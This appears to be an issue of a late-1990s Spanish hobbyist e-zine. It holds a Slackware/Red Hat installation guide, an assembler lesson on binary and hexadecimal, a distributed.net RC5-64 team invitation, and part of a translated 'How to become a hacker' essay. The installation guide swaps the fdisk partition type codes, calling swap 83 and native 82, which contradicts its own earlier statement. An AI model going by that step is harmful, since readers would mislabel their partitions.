particularmente yo me cambie de Red Hat a slackware y creo que me quedo ,
tiene  muchas aplicaciones  interesantes  y  la instalacion  es  un  poco
tediosa ya que debes indicar uno a uno los paquetes  a  instalar  a menos
que  le  des instalar todo , si decides instalar todo entonces te aseguro
que te  saturara  el  disco duro con unos 500 megas de donde tal vez unos
80 o 100  no utilizaras entre servidores de noticias y otras cosas.

S.U.S.E :  esta  distribucion de  linux  alemana posee  dos versiones una
para alemania y otra  en ingles para el resto del Mundo, se dice que esta
distribucion es ideal para principiantes pero a mi juicio esta distribucion
tiene muy poco software disponible  en comparacion con el  Slackware o el 
Red  Hat aunque si la tienes a la mano no cuesta nada probar.

Open Lite Caldera Linux : el  linux en español ,tiene comandos en español
al igual que las ayudas o sea que mejor imposible si deseas iniciarte .

Debian Linux : Esta  es  una de las  distribuciones  mas  recientes , que
promete ser muy buena ademas de que posee  su  manejador  de  paquetes de
instalacion al estilo de Red Hat y con la  salvedad  de que es mas barato
que muchas otras y mas facil de adquirir.

    Desde  ahora  en  adelante  describire  el  metodo  de instalacion de
Slackware Linux que es muy similar al Red Hat pero con la  diferencias de
que con Red Hat necesitas un solo disco para instalacion.El Linux necesita 
una particion en la cual recidir la cual es la Particion  Nativa de Linux 
que reconocida con el tipo 83  por el fdisk en linux,  en  esta particion
recidira linux y sus componentes ,ademas de esta particion linux necesita
una particion swap o de intercambio que hace las  veces  de una extension
de la memoria RAM de la maquina y que es necesaria si  la maquina tiene 8 
megas de RAM o menos ,al contrario de slackware en el cual dicha particion 
es  opcional  mientras que  en RED HAT es obligatoria.

    Para crear dichas particiones  primero debes hacer espacio para ellas 
y determinar el tamaño de las  mismas,  si  tienes  actualmente  una sola
particion en el disco duro y no deseas perder tus datos entonces la opcion 
para  hacer  el  espacio  es FIPS o PARTITION MAGIC  ambos   programas se  
encuentran  en  internet   aunque el FIPS muchas veces viene  en los cd's
de Linux  , dichos programas  te  permiten re-particionar  el  disco duro
sin perder los datos que tenias  antes solo jugando  con el espacio libre
disponible . Si  no dispones de estos programas  y  no  te  importa  como 
a  mi perder algo del win entonces tienes  dos opciones una  el fdisk del
DOS y otra el fdisk de linux ,lo mejor que puedes hacer es primero dividir
el disco duro en dos con el fdisk del DOS y crear una  particion primaria
del DOS  en la  que  recidira  el WIN9X o el  2000  cuando  este, una vez
creadas dichas particiones entonces desde el msdos procedes a la creacion
de los discos boot y root que son necesarios para la  instalacion y  para 
ello utilizas el rawrite  en  msdos, antes  de crear dichos  discos debes
determinar que imagen  utilizaras en la instalacion  tanto  para  el boot
como para el root, las  imagenes  son el  kernel y  el  soporte  para  el
hardware de tu PC por eso si tienes dispositivos scsi es distinta a si no
los tienes por eso debes leer el README que aparece adjunto a los archivos
de las imagenes en mi caso para el boot tome la imagen bare.i  y  para el
root tome la color.i qu e son las  que  tienen  el  soporte mas  generico
ademas de  tener  controladores  para  cd  IDE/ATAPI que es el que tengo ,
ademas  la instalcion en mi  caso es  desde  un cd pero se puede instalar
desde el disco duro previoa haber bajado el linux o desde ftp en  una red 
,usted elije el de su preferencia de acuerdo al  tipo de instalacion.

Como Crear el DIsco Boot y Root ??????

    Una vez que hemos elegido las imagenes desde msdos y con dos discos
31/2 utilizamos el rawrite de esta forma :

> rawrite  enter

luego el  les  pedira  el  nombre de la  imagen y su  ubicacion y le  dan
enter (por  supuesto que despues  de  haber respondido) ,seguidamente les
pedira el  drive   en  el  que  crearan  la  imagen y  alli  colocan  a: 
,esto lo repiten dos veces con el boot y  el  root  a  menos que esten en
Red Hat y solo necesitan el boot para instalar de cd's.

una  vez  hecho  esto  deben  cambiar el  setup de la  maquina  para  que
arranque  desde disco 3 1/2  y  re-arrancar  la  maquina. Al Reiniciar la
maquina con  el disco  boot primero veran como se carga el kernel de linux
desde el disco  y  veran  aparecer  un  mensaje  en  la pantalla diciendo
"Instalacion  de  Slackware 3.6 " o   algo  asi ,imagino  que   en  otras
distribuciones es parecido  al  menos  en  red hat lo es,  una vez en ese
punto les saldra un prompt diciendo " boot :" esperando alguna instruccion
que pueda  ser  necesaria  para  un  tipo  particular  de  arranque si el
necesario o a veces para indicarle desde  donde arrancar en  nuestro caso
simplemente con pulsar enter basta, a partir de alli se inicia la carga de
linux y le sera solicitado el disco root y una vez que lo introduzca dicho
disco lo proximo sera un mensaje pidiendo el "login:" que es el nombre de
usuario en el sistema pero en este sera root.  Una vez hecho esto tendras
el prompt del  sistema a  tu  disposicion  para crear las  particiones de
linux si ya no las tienes .

Crear Particiones con el fdisk del Linux.

en el prompt debes escribir
# fdisk  enter
y luego le das  la opcion "m" y enter para ver la ayuda del fdisk

en las opciones tendras
d - borra una particion
l  - te dice todos los tipos de particion reconocidos por el kernel
q - sale sin guardar los cambios
p - imprime la tabla de particiones en pantalla
w - sale guardando los cambios
t  - cambia el tipo de particion( los tipos son los mostrados con l )
n - crea una nueva particion
m - muestra el menu de opciones

ok
en este punto le damos n
y te pregunta el numero de la particion que vas a crear
ya que el linux renoce la particiones asi
/dev/hda   es un disco duro
/dev/hda1  particion 1 en el disco duro hda , en este  nuestro caso  esa
es la particion de dos o de win

/dev/hda2 3,4  y etc estan disponibles para linux

entonces le puedes dar  2

una  vez  hecho  esto  te pedira  el  numero del primer cilindro de esta
particion y  te  sugerira uno  por  defecto  mostrado  asi " [ 524 ] " o
el que sea , aca le puedes dar simplemente enter ya que ese  es el primer
cilindro  disponible, luego te pedira el cilindro en el cual terminara o
en su defecto  el tamaño en  megabytes  por   lo cual  puedes decidir en
darle 100,200,300,1200 o la cantidad de megas que quieras te aconsejo mas
de 400 para que no te falte espacio si estas creando la native o principal,
el mismo procedimiento lo repites  con la swap pero luego de creadas las 
particiones debes decirle a  linux  quien  es  quien o sea asignarles el
identificador para la swap el 83 y la nativa el 82, eso se  hace  con la
opcion t del menu y luego w para grabar .

    Despues  de creadas las particiones solo te queda instalar linux  si
estas en slackware le das  "setup "  enter  y se inicia  la  instalacion
desde alli en adelante debes comenzar a elegir el tipo de  instalacion y
que quieres instalar, si es en Red Hat alli la instalacion es guiada  de
manera  intuitiva   a  travez  de  menus  que  te  permiten ir  haciendo
todo lo necesario desde crear particiones de disco y demas por lo que la
instalacion de este es mas facil,  volviendo al slackware debes crear un
disco boot  por si quieres arrancar el linux en vez del win y no  tienes 
LILO(Linux Loader) que es un programa que te permite elegir entre  linux
y el resto  de sistemas operativos que tengas instalados en el arranque.
Si es tu primera vez te sugiero que dejes que lilo se instale solo en el
modo "newbie" y el detectara que tienes win por ejemplo y linux , por lo
que te colocara un  menu  que  contenga  los dos  para  que decidas cual
arrancar.

    En la Instalacion del Slackware debes decirle desde donde se instala
si desde el CD o desde ftp y ademas decirle en donde se instalara por lo
que alli debes colocar "/" que es la  raiz   o  lo  que  en  analogo  en
msdos "c:\",  al  elegir  esto solo te falta comenzar la instalacion  de 
Linux.

algunos web site de las distribuciones de Linux.

http://www.redhat.com  Red Hat Linux
http://slackware.org      Slackware Linux
http://www.suse.com     S.U.S.E

otros sites de Linux:

http://linux.box.sk
http://linux.org
http://bactery.8m.com  : )
http://linux.ncc.org
http://linux.org.ve


bueno espero que esta guia les sirva de algo cualquier problema pueden
contactarme
via  email.

atte
DoctorX
email: d0ct0r_x@bactery.8m.com
http://bactery.8m.com  -  Zona de Bacterias
"El Conocimiento es el Poder"

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
OCHO                                                                Programación
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Segunda entrega del curso de Assembler, extractado de la pagina de la 
Universidad de Guadalajara.

------------------------

Sistemas numéricos

El sistema numérico que utilizamos a diario es el sistema decimal, pero este 
sistema no es conveniente para las máquinas debido a que la información se 
maneja codificada en forma de bits prendidos o apagados; esta forma de 
codificación nos lleva a la necesidad de conocer el cálculo posicional que nos 
permita expresar un número en cualquier base que lo necesitemos.

Es posible representar un número determinado en cualquier base mediante la 
siguiente formula:

Donde n es la posición del dígito empezando de derecha a izquierda y numerando a 
partir de cero. D es el dígito sobre el cual operamos y B es la base numérica 
empleada.

Convertir números binarios a decimales

Trabajando en el lenguaje ensamblador nos encontramos con la necesidad de 
convertir números del sistema binario, que es el empleado por las computadoras, 
al sistema decimal utilizado por las personas.

El sistema binario está basado en unicamente dos condiciones o estados, ya sea 
encendido (1) o apagado (0), por lo tanto su base es dos.

Para la conversión podemos utilizar la formula de valor posicional:

Por ejemplo, si tenemos el numero binario 10011, tomamos de derecha a izquierda 
cada dígito y lo multiplicamos por la base elevada a la nueva posición que 
ocupan:

Binario:       1       1       0       0       1

Decimal:     1*2^0 + 1*2^1 + 0*2^2 + 0*2^3 + 1*2^4

           =   1   +   2   +   0   +   0   +   16   =  19 decimal.

El caracter ^ es utilizado en computación como símbolo de potenciación y el 
caracter * se usa para representar la multiplicación.

Convertir números decimales a binarios

Existen varios métodos de conversión de números decimales a binarios; aquí solo 
se analizará uno. 

Naturalmente es mucho mas fácil una conversión con una calculadora científica, 
pero no siempre se cuenta con ella, así que es conveniente conocer por lo menos 
una forma manual para hacerlo.

El método que se explicará utiliza la división sucesiva entre dos, guardando el 
residuo como dígito binario y el resultado como la siguiente cantidad a dividir.

Tomemos como ejemplo el número 43 decimal.

43/2 = 21 y su residuo es 1

21/2 = 10 y su residuo es 1

10/2 = 5 y su residuo es 0

5/2 = 2 y su residuo es 1

2/2 = 1 y su residuo es 0

1/2 = 0 y su residuo es 1

Armando el número de abajo hacia arriba tenemos que el resultado en binario es 
101011

Sistema hexadecimal

En la base hexadecimal tenemos 16 dígitos que van del 0 al 9 y de la letra A 
hasta la F (estas letras representan los números del 10 al 15). Por lo tanto, 
contamos 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E y F.


La conversión entre numeración binaria y hexadecimal es sencilla. Lo primero que 
se hace para una conversión de un número binario a hexadecimal es dividirlo en 
grupos de 4 bits, empezando de derecha a izquierda. En caso de que el último 
grupo (el que quede mas a la izquierda) sea menor de 4 bits se rellenan los 
faltantes con ceros.

Tomando como ejemplo el número binario 101011 lo dividimos en grupos de 4 bits y 
nos queda:

10; 1011

Rellenando con ceros el último grupo (el de la izquierda):

0010; 1011

Después tomamos cada grupo como un número independiente y consideramos su valor 
en decimal:

0010 = 2; 1011 = 11

Pero como no podemos representar este número hexadecimal como 211 porque sería 
un error, tenemos que sustituir todos los valores mayores a 9 por su respectiva 
representación en hexadecimal, con lo que obtenemos:

2BH (Donde la H representa la base hexadecimal)

Para convertir un número de hexadecimal a binario solo es necesario invertir 
estos pasos: se toma el primer dígito hexadecimal y se convierte a binario, y 
luego el segundo, y así sucesivamente hasta completar el número.

Código ASCII

ASCII generalmente se pronuncia "aski", es un acrónimo de American Standard Code 
for Information Interchange.

Este código asigna a las letras del alfabeto, a los dígitos decimales del 0 al 9 
y a varios símbolos adicionales un número binario de 7 bits (poniéndose el bit 8 
en su estado de apagado o 0).

De esta forma cada letra, dígito o caracter especial ocupa un byte en la memoria 
de la computadora.

Podemos observar que este método de representación de datos es muy ineficiente 
en el aspecto numérico, ya que en formato binario nos basta un solo byte para 
representar numeros de 0 a 255, en cambio con el código ASCII un byte puede 
representar unicamente un dígito.

Debido a esta ineficiencia, el código ASCII es principalmente utilizado en la 
memoria para representar texto.

Metodo BCD

BCD es un acrónimo de Binary Coded Decimal.

En esta notación se utilizan grupos de 4 bits para representar cada dígito 
decimal del 0 al 9. Con este método podemos representar dos dígitos por byte de 
información.

Aún cuando este método es mucho mas práctico para representación de números en 
la memoria en comparación al ASCII, todavía se queda por debajo del binario, ya 
que con un byte en el método BCD solo podemos representar dígitos del 0 al 99, 
en cambio, en formato binario podemos representar todos los dígitos desde 0 
hasta 255.

Este formato es utilizado principalmente para representar números muy grandes en 
aplicaciones mercantiles ya que facilita las operaciones con los mismos evitando 
errores de redondeo.

                                                        Derechos Reservados.1995                                      
                                                      UNIVERSIDAD DE GUADALAJARA
                                Coordinacion General de Sistemas de Informacion.

------------------------

La segunda parte, vamos avanzando en este curso de Assembler que espero informe 
a todos qué es y nos dé bases para trabajar con él...

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
NUEVE                                                            Rc-5 Crack Team
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

(Tomado y Adaptado de la FAQ de Distributed.net)

El Proyecto Bovino RC5-64 es un proyecto de distributed.net Fue formado en Marzo 
de 1997 y a través de distributed.net se provee software y la infraestructura de 
red requerida para él mismo y para que puedan participar computadoras alrededor 
del mundo por medio de bloques RC5-64.

El Concurso de la Clave Secreta consiste de 13 concursos diferentes. Hasta el 
momento han sido exitosamente terminados los RC5-32/12/7 (RC5-56) en Octubre de 
1997 y ahora tiene sus equipos destinados en el Concurso RC5-32/12/8  (RC5-64). 
Éste pretende evaluar 2^64 (18,446,744,073,709,551,616) claves para encontrar la 
única apropiada para desencriptar el mensaje del concurso. Para esto se necesita 
una enorme cantidad de computadoras para su éxito. Participantes de toda la 
Internet proveen esa capacidad trabajando en sus computadoras personales. Todas 
esos equipos juntos ayudan a hacer el Computador distribuido más poderoso en la 
Tierra.

¿Por qué se hace esto?
1. Para hacer algo con el computador
Cuando utilizamos nuestro PC no utilizamos todo su potencial, esta es una forma 
de hacerlo.

2. Para probar que un algoritmo de 64 bits es insuficiente
Ya se ha descifrado el de 56... ahora este.

3. Para explorar las posibilidades de trabajo cooperativo en red
Es fascinante saber que hay tanta gente trabajando en esto y desde todas partes 
del mundo.

4. Porque es divertido
Así como es divertido para algunos escribir un programa de tic-tac-toe (triqui o 
tres en raya) en el sendmail.cf, es divertido para otros este tipo de concursos.

5. Porque puedes ganar dinero
Hay un premio de US$10.000 dólares para quien pueda descifrarlo, que se reparten 
así: US$8.000 para una entidad sin ánimo de lucro, $1.000 para el equipo y 
$1.000 para el participante. 6. Para aprovechar y conocer más gente Es 
interesante toda la gente que se puede conocer en este proyecto. 7. Para atraer 
al sexo opuesto Bueno, quizá, uno nunca sabe.

----

Para participar de este concurso, sólo se necesita bajar un programa cliente 
desde distributed (www.distributed.net) en esta dirección: 

<http://rc5.distributed.net/cgi/select.cgi>

En la cual se encuentran clientes para muchos sistemas operativos y máquinas, 
luego de configurarlo* de la forma apropiada y ponerlo a trabajar (se debe estar 
conectado a Internet) hay que esperar 24 horas e ir a la página de distributed 
(http://rc5stats.distributed.net/) y agregarse a un equipo. El cliente funciona 
más o menos así: "es un programa funcionando en decenas de miles de ordenadores 
por todo el mundo. Cada programa se hace cargo de un pequeño número de claves 
(digamos mil millones), las comprueba y luego se conecta a otro ordenador 
"coordinador" para decirle "éstas no son" y pedir un bloque nuevo".

*Desde esta revista electrónica hemos lanzado un equipo llamado Mr. Silence RC5 
Crack Team, para unirse estos son los pasos:

Después de configurar el cliente con el correo electrónico y haber enviado 
siquiera un bloque, se esperan 24 horas y desde distributed.net envían un correo 
dando la información y acompañado de una contraseña.

Si quiere unirse al equipo Mr. Silence vaya a esta dirección:
http://rc5stats.distributed.net/rc5-64/tmsummary.php3?team=11014
y siga el vínculo: "I want to join this team!" y listo.

Si no le agrada participar en este equipo puede utilizar los espacios de 
búsqueda para encontrar uno apropiado o trabajar solo, eso es decisión de cada 
uno.

Si no quiere utilizar su dirección de correo electrónica, puede utilizar esta: 
rc5@mrs.zzn.com que es la del equipo. Además el cliente lo puede instalar en 
todos las computadoras que desee.

Si la computadora no está conectada a Internet, estos son los pasos a seguir 
para recibir y enviar bloques por correo electrónico

Recibir Bloques

Cree un mensaje dirigido a fetch@distributed.net con las siguientes líneas:

	blocksize=<número entre 28 y 31>
	numblocks=<número menor de 1000>

personalmente prefiero blocksize 30 y numblocks 100

Pasados unos minutos (algunas veces horas) se recibe un mensaje con un atache 
llamado "buff-in.rc5" el cual debe ser guardado en el mismo directorio donde se 
encuentra el cliente (sobreescribiendo el existente) y ejecutando el programa.

Cuando el cliente haya terminado estos bloques se deben enviar por correo 
electrónico de la siguiente forma:

Cree un mensaje dirigido a flush@distributed.net con el archivo "buff-out.rc5" 
atachado por UUencode o por Mime64. Unos minutos después (a veces horas) se 
recibe un mensaje del correcto procesamiento de los bloques.

Borre el archivo "buff-out.rc5" del directorio del cliente y vuelva a 
ejecutarlo.

Antes de hacer estos procedimientos, recuerde terminar la aplicación cliente 
para evitar posibles fallos.

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
DIEZ                                                             Notas al margen 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Un texto de esos que se encuentran en la red, pero que no todo el mundo
accede para leerlos...
-----

Como transformarse en un hacker

¿Porqué existe este documento?

En mi trabajo como editor del Archivo de la jerga, recibo frecuentemente 
mensajes de novatos que consultan "¿cómo puedo aprender a ser un hacker 
mágico?". Triste es decir que no parece haber ninguna FAQ ni documento Web que 
trate este tema vital, así que ahí va el mío. 

Si Ud. está leyendo una copia de este documento fuera de la red, la versión 
original en inglés actualizada está en 
http://www.ccil.org/~esr/faqs/hacker-howto.html, y la traducción al castellano 
está en http://usuarios.santafe.com.ar/~cballard/pf/hacker-howto.es.html. 

¿Qué es un hacker?

El Archivo de la jerga contiene un montón de definiciones del término 'hacker', 
la mayoría de las cuales tiene que ver con la afición a lo técnico, y la 
capacidad de deleitarse en la solución de problemas y al sobrepujar los límites. 
Si Ud. quiere saber como transformarse en hacker, bien, sólo dos son realmente 
relevantes. 

Existe una comunidad, una cultura compartida, de programadores expertos y brujos 
de redes, que cuya historia se puede rastrear décadas atrás, hasta las primeras 
minicomputadoras de tiempo compartido y los primigenios experimentos de ARPAnet. 
Los miembros de esta cultura acuñaron el término `hacker'. Los hackers 
construyeron la Internet. Los hackers hicieron del sistema operativo UNIX lo que 
es en la actualidad. Los hackers hacen andar Usenet. Los hackers hacen que 
funcione la WWW. Si Ud. es parte de esta cultura, si Ud. ha contribuído a ella y 
otra gente lo llama a Ud. hacker, entonces Ud. es un hacker. 

La mentalidad de hacker no está confinada a esta cultura de hackers en software. 
Hay personas que aplican la actitud de hacker a otras cosas, como electrónica o 
música -- de hecho, puede Ud. encontrarla en los más altos niveles de cualquier 
ciencia o arte. Los hackers en software reconocen estos espíritus emparentados y 
los denominan `hackers' también -- y algunos sostienen que la naturaleza de 
hacker es en realidad independiente del medio particular en el cual el hacker 
trabaja. En el resto de este documento nos concentraremos en las habilidades y 
actitudes de los hackers en software, y en las tradiciones de la cultura 
compartida que originó el término `hacker'. 

Existe otro grupo de personas que a los gritos se autodenominan hackers, pero no 
lo son. Éstas son personas (principalmente varones adolescentes) que se 
divierten ingresando ilegalmente en computadoras y estafando al sistema de 
telefonía. Los hackers de verdad tienen un nombre para esas personas: 
`crackers', y no quieren saber nada con ellos. Los hackers de verdad opinan que 
la mayoría de los crackers son perezosos, irresponsables, y no muy brillantes, y 
fundamentan su crítica en que ser capaz de romper la seguridad no lo hace a uno 
un hacker, de la misma manera que ser capaz de encender un auto con un puente en 
la llave no lo puede transformar en ingeniero en automotores. 
Desafortunadamente, muchos periodistas y editores utilizan erróneamente la 
palabra `hacker' para describir a los crackers; esto es causa de enorme 
irritación para los verdaderos hackers. 

La diferencia básica es esta: los hackers construyen cosas, los crackers las rompen. 

Si Ud. desea ser un hacker, continúe leyendo. Si Ud. quiere ser un cracker, 
mejor mire en el foro de discusión alt.2600 y prepárese para soportar la dura 
realidad cuando descubra que no es tan listo como se cree. Y eso es todo lo que 
voy a decir acerca de los crackers. 

La actitud del hacker

Los hackers resuelven problemas y construyen cosas, y creen en la libertad y la 
ayuda voluntaria mutua. Para ser aceptado como hacker, Ud. deberá comportarse 
como si tuviera esta clase de actitud en su interior. Y para comportarse como si 
tuviera esta actitud, deberá creer en verdad en dicha actitud. 

Pero si Ud. piensa que el cultivo de las actitudes de hacker es una forma de 
ganar aceptación en la cultura, malinterpretará el tema. La transformación en la 
clase de persona que cree en esas cosas es importante para ayudarlo a aprender y 
mantenerlo motivado. Como en las artes creativas, el modo más efectivo de 
transformarse en un maestro es imitar la mentalidad de los maestros -- no sólo 
intelectualmente, sino además emocionalmente. 

Por lo tanto, si Ud. quiere ser un hacker, repita lo siguiente hasta que lo 
crea: 

1. El mundo está lleno de problemas fascinantes que esperan ser resueltos.

Es muy divertido ser un hacker, pero es la clase de diversión que requiere mucho 
esfuerzo. El esfuerzo requiere motivación. Los atletas exitosos obtienen su 
motivación a partir una clase de placer físico que surge de trabajar su cuerpo, 
al forzarse a sí mismos más allá de sus propios límites físicos. De manera 
similar, para ser un hacker Ud. deberá sentir un estremecimiento de tipo 
primitivo cuando resuelve un problema, aguza sus habilidades, y ejercita su 
inteligencia. 

Si Ud. no es la clase de persona que naturalmente siente de esta manera las 
cosas, necesitará poder experimentarlas para llegar a ser un hacker. De otra 
manera, encontrará que su energía para `hackear' será absorbida por otras 
distracciones como sexo, dinero y aprobación social. 

(Además deberá desarrollar cierta clase de fe en su propia capacidad de 
aprendizaje -- la creencia de que aún cuando pueda no saber todo lo que necesita 
para resolver el problema, si agarra una parte de él y aprende desde allí, 
aprenderá lo suficiente para resolver la siguiente parte, y así, hasta que lo 
resuelva completo.) 

2. Nadie debería tener que resolver un problema dos veces.

Los cerebros creativos son un recurso valioso y limitado. No deben 
desperdiciarse reinventando la rueda cuando hay tantos y tan fascinantes 
problemas nuevos esperando por allí. 

Para comportarse como hacker, Ud. debe creer que el tiempo empleado para pensar 
por los otros hackers es precioso -- tanto, que es casi una obligación moral 
para Ud. el compartir la información, resolver los problemas y luego exponer la 
solución de manera que los otros hackers puedan resolver nuevos problemas, en 
lugar de enfrentarse perpetuamente con los viejos. 

(No tiene Ud. que pensar que está obligado a regalar todo su producto creativo, 
aunque aquellos hackers que lo hacen son los que obtienen más respeto de los 
demás hackers. Se considera consistente con los valores de un hacker que se 
venda lo suficiente para pagar la comida, la casa y los gastos relacionados con 
la computadora. También es consistente la utilización de estas habilidades de 
hacker para sostener a su familia, o incluso hacerse rico, siempre que Ud. no se 
olvide que es un hacker mientras lo hace.) 

3. Lo aburrido y lo rutinario es malo.

Los hackers (y las personas creativas en general) nunca debieran ser sometidas a 
trabajos rutinarios, porque cuando esto sucede significa que no están haciendo 
lo único que deben hacer: resolver nuevos problemas. Este desperdicio de talento 
daña a todo el mundo. Por ello, las tareas rutinarias, repetitivas y aburridas 
no sólo son displacenteras, sino intrínsecamente malas. 

Para comportarse como hacker, debe Ud. creer en esto lo suficiente como para 
automatizar aquellas porciones de tareas todo lo que se pueda, no solamente por 
Ud., sino para beneficio de todos los demás (especialmente otros hackers). 

(Existe una aparente excepción a esta regla. Los hackers hacen cosas a veces que 
pueden parecer repetitivas o aburridas pero como ejercicio para lograr limpieza 
mental, o para obtener cierta habilidad, u obtener cierta clase de experiencia 
que no podría tener de otro modo. Pero esto es una elección -- ninguna persona 
pensante debiera nunca ser forzada a hacer cosas aburridas.)

4. La libertad es buena.

Los hackers son naturalmente anti-autoritaristas. Cualquiera que le pueda dar 
órdenes, puede hacer que deba dejar de resolver ese problema con el cual está 
Ud. fascinado -- y, debido a la manera en la cual trabajan las mentes 
autoritarias, encontrarán alguna razón espantosamente estúpida para hacerlo. Por 
eso, la actitud autoritaria debe ser combatida donde sea que se la encuentre, 
pues si se la deja lo asfixiará, tanto a Ud. como a los otros hackers. 

(Esto no es lo mismo que combatir toda autoridad. Los niños necesitan guía, y 
los criminales restricciones. Un hacker puede estar de acuerdo en aceptar cierta 
clase de autoridad para poder obtener algo que desea más que el tiempo que gasta 
en seguir órdenes. Pero éste es un pacto limitado, conciente; la clase de 
sumisión que desean los autoritarios no está en oferta.) 

Los autoritarios florecen en la censura y el secreto. Y desconfían de la 
cooperación voluntaria y el intercambio de información -- sólo les agrada la 
cooperación que tienen bajo su control. Así que para comportarse como hacker, 
Ud. deberá desarrollar una hostilidad instintiva hacia la censura, el secreto, y 
la utilización de la fuerza o el fraude para someter a adultos responsables. Y 
deberá estar preparado para actuar en consecuencia. 

5. La actitud no es sustituto para la competencia.

Para ser un hacker, deberá desarrollar algunas de esas actitudes. Pero tener la 
actitud solamente no lo transformará en hacker, como tampoco lo puede 
transformar en un atleta campeón o en estrella del rock. Para transformarse en 
hacker necesitará inteligencia, práctica, dedicación, y trabajo pesado. 

Por lo tanto, debe aprender a desconfiar de la actitud y respetar la competencia 
en todas sus formas. A ningún hacker le gusta perder el tiempo con quienes 
adoptan la pose de hacker, sino que veneran la competencia -- especialmente la 
competencia al hackear, pero la competencia encualquier ámbito está bien. 
Especialmente buena es la competencia en habilidades exigentes que pocos pueden 
dominar, y la mejor es la competencia en habilidades exigentes que involucran 
agudeza mental, maña y concentración. 

Si Ud. respeta la competencia, disfrutará desarrollándola en sí mismo -- el 
pesado trabajo y la dedicación se transformarán en una especie de juego intenso, 
y no una rutina. Y éso es lo vital para transformarse en hacker. 

Habilidades básicas en un hacker

La actitud del hacker es vital, pero más aún lo son las habilidades. La actitud 
no es sustituto para la competencia, y existe un cierto conjunto de herramientas 
básicas que Ud. debe dominar antes que cualquier hacker sueñe con llamarlo de 
ese modo. 

Este conjunto cambia lentamente a lo largo del tiempo a medida que la tecnología 
crea nuevas habilidades y descarta otras por obsoletas. Por ejemplo, se incluía 
la programación en lenguaje de máquina, y no se hablaba de HTML hasta hace poco. 
Pero hacia finales de 1996, es claro que se debe incluir lo siguiente: 

1. Aprenda a programar.

Esta es, por supuesto, la habilidad fundamental del hacker. En 1997 el único 
lenguaje que Ud. debe conocer sí o sí es C. Pero no crea que podrá ser un 
hacker, siquiera un programador, si conoce solamente un único lenguaje -- Ud. 
debe aprender como pensar en los problemas de programación de una manera 
general, independiente de cualquier lenguaje. Para ser un hacker de verdad, Ud. 
debe llegar al punto en el cual puede aprender un lenguaje nuevo en días, 
relacionando lo que está en el manual con lo que ya sabe de antes. Esto 
significa que Ud. debe aprender varios lenguajes muy diferentes entre sí. 

Además de C, Ud. deberá aprender al menos LISP y Perl (y Java está presionando 
fuerte por un lugar en esa lista). Además de ser los lenguajes más importantes 
para hackear, a su vez representan enfoques muy diferentes a la tarea de la 
programación, y lo educarán de distintas y valiosas maneras. 

No puedo explicar en detalle en este documento como puede aprender a programar 
-- es una habilidad compleja. Pero puedo adelantarle que los libros y los cursos 
no servirán (muchos, y tal vez la mayoría de los mejores hackers son 
autodidactas). Lo que sí servirá es (a) leer código y (b) escribir código. 

El aprendizaje de la programación es como aprender a escribir bien en lenguaje 
natural. La mejor manera de aprender es leer algo de las cosas escritas por los 
maestros del estilo, luego escribir algunas cosas Ud. mismo, leer mucho más, 
escribir un poco más ... y repetir esto hasta que lo que escribe empieza a 
mostrar la clase de fuerza y economía que aprecia en sus modelos. 

Antes era difícil encontrar código de buena calidad para leer, porque había 
pocos programas de cierta magnitud disponibles en código fuente de tal manera 
que los nóveles hackers pudieran meterles mano. Esta situación ha cambiado 
dramáticamente: software libre, herramientas de programación libres, y sistemas 
operativos libres (todo disponible con su código fuente, y todo ello hecho por 
hackers) están ampliamente disponibles en la actualidad. Lo que me lleva 
elegentemente a nuestro siguiente tema... 

2. Obtenga uno de los UNIXs libres y aprenda a usarlo y a ponerlo en 
funcionamiento.

Doy por sentado que Ud. tiene una computadora personal o puede conseguir acceso 
a una de ellas (a estos muchachos de hoy día les resulta tan sencillo obtenerlas 
:-)). El paso con mucho más importante que cualquier novato puede dar en el 
camino de adquirir las habilidades de un hacker es obtener una copia de Linux o 
alguno de los otros Unixs tipo BSD libres, instalarlo en una máquina personal, y 
hacerlo funcionar. 

Si, es cierto que existen otros sistemas operativos en el mundo además de Unix. 
Pero sólo pueden encontrarse en formato binario -- Ud. no puede ni leer el 
código ni modificarlo. Si intenta aprender a hackear en una máquina DOS, Windows 
o en un MacOS se sentirá como si trata de bailar metido en un cajón. 

Además de eso, Unix es el sistema operativo de la Internet. Si bien Ud. puede 
aprender a usar la Internet sin saber Unix, nunca podrá ser un hacker en 
Internet sin conocerlo. Por este motivo, la cultura hacker actual está centrada 
fuertemente en Unix. (Esto no siempre fue así, e incluso la situación le 
desagrada a algunos de los hackers más viejos, pero la simbiosis entre Unix y la 
Internet es tan fuerte que hasta la energía de Microsoft parece incapaz de 
hacerle mella.) 

Así que, obtenga un Unix -- personalmente me gusta Linux, pero hay otros. 
Apréndalo. Hágalo funcionar. Métale mano, anímese. Comuníquese en Internet 
mediante él. Lea el código. Modifíquelo. En ese sistema se incluyen las mejores 
herramientas de programación (que incluyen C, Lisp y Perl) de lo que cualquier 
sistema operativo de Microsoft ni siquiera podría soñar, además se divertirá y 
se sumergirá en un caudal de conocimientos de tal magnitud que nunca hubiera 
imaginado, hasta que en cierto momento, mirando hacia atrás, se dará cuenta que 
ya es un maestro hacker consumado. 

Si quiere saber más acerca del aprendizaje de Unix, mire The Loginataka. 

Para meter mano en un Linux, mire en el directorio de distribuciones Linux o en 
el programa `Linux CD Giveaway' en Sunsite. 

3. Aprenda como usar la World Wide Web y escribir en HTML.

La mayoría de las cosas que ha construído la cultura hacker trabajan fuera de la 
vista del gran público, ayudando en el funcionamiento de fábricas, oficinas y 
universidades, y carecen de un impacto obvio en la vida de los que no son 
hackers. La Web es la única gran excepción, y es tan enorme y brillante este 
